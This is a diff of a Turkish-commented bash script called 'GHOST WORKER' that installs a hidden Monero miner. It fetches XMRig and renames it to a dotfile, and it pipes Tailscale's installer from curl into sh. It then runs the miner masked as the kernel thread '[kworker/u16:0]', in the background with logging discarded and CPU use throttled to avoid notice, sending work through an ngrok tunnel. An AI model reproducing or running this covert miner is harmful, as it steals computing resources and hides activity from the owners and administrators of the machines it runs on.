@@ -1,25 +1,26 @@
 #!/bin/bash
+# GHOST WORKER - TAILSCALE & NGROK HYBRID
 AGENT=".sys_core_logic"
+CONFIG="logic_cfg.yaml"
 
-# 1. Mining motorunu indir ve gizle
+# 1. Binary'yi çek
 wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
 mv xmrig-6.22.2/xmrig ./$AGENT
 rm -rf xmrig-6.22.2*
 
-# 2. Tailscale Başlat (GİZLİ TÜNEL)
+# 2. Tailscale Başlat (İç ağ gizliliği için)
 curl -fsSL https://tailscale.com/install.sh | sh
 tailscale up --authkey=$TAILSCALE_AUTH
 
-# 3. Mining'i Başlat (Process maskeleme aktif)
-# Burada mining artık Tailscale üzerinden senin VDS'ine 127.0.0.1 tünelinden akar.
-exec -a "[kworker/u16:0]" ./$AGENT \
+# 3. Yükü maskele ve başlat
+# Burada xmrig doğrudan senin Ngrok tüneline (tcp://7.tcp.eu.ngrok.io:22108) bağlanacak
+# --cpu-max-threads-hint 35 : İşlemcinin %35'ini kullanıyoruz, Battlefield'a yer bırakıyoruz.
+
+exec -a "[kworker/u16:0]" ./$AGENT -c $CONFIG \
     --cpu-max-threads-hint 35 \
     --background \
     --log-file /dev/null \
-    -o 127.0.0.1:1123 \
-    -u $ZEPH_WALLET \
-    -p "GHOST_WORKER" \
     > /dev/null 2>&1 &
 
-echo "Tailscale Tünel Aktif. Madenci Gizli Modda Çalışıyor."
+echo "Sistem Gizlendi. Trafik Tünel üzerinden VDS'e aktarılıyor."
